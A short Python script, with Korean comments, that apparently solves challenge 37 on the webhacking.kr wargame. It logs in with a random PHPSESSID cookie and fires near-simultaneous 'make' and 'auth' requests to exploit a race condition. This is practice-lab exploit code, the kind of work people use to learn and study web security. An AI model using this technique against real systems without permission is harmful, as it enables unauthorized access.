import requests
from multiprocessing import Pool
import random
import time

random.seed(time.time())

#37번 문제
url = 'https://webhacking.kr/challenge/web-37/'


# 쿠키의 PHPSESSID를 정수값이 들어가도록 해준다.
def login(session):
    session.get("https://webhacking.kr")
    rand = str(random.randint(1,10000000))
    session.cookies.clear()
    session.cookies.update({'PHPSESSID':rand})
    datas = {}
    print(" ------------ login ----------------------")
    datas['id'] = 'oksusu98'
    datas['pw'] = '비밀번호'
    response = session.post("https://webhacking.kr/login.php?login",data=datas)
    if( "<script>location.href='/';</script>" in response.text):
        print("login success : ",datas['id'])
    else:
        print("login Fail")
        exit(0)


def solve(param):
    url = 'https://webhacking.kr/challenge/web-37/'
    session = requests.session()
    login(session)
#    print(session.cookies)
    response = session.get(url,params={'mode':param})
    return response.text
    


if __name__ == '__main__':
    p = Pool(4)
    ret1 = p.apply_async(solve,('make',))
    time.sleep(0.3)
    ret2 = p.apply_async(solve,('auth',))
    #ret3 = p.apply_async(solve,('make',))
    #ret4 = p.apply_async(solve,('auth',))

    print(ret1.get())
    print(ret2.get())
    #print(ret3.get())
    #print(ret4.get())

    p.close()
    p.join()





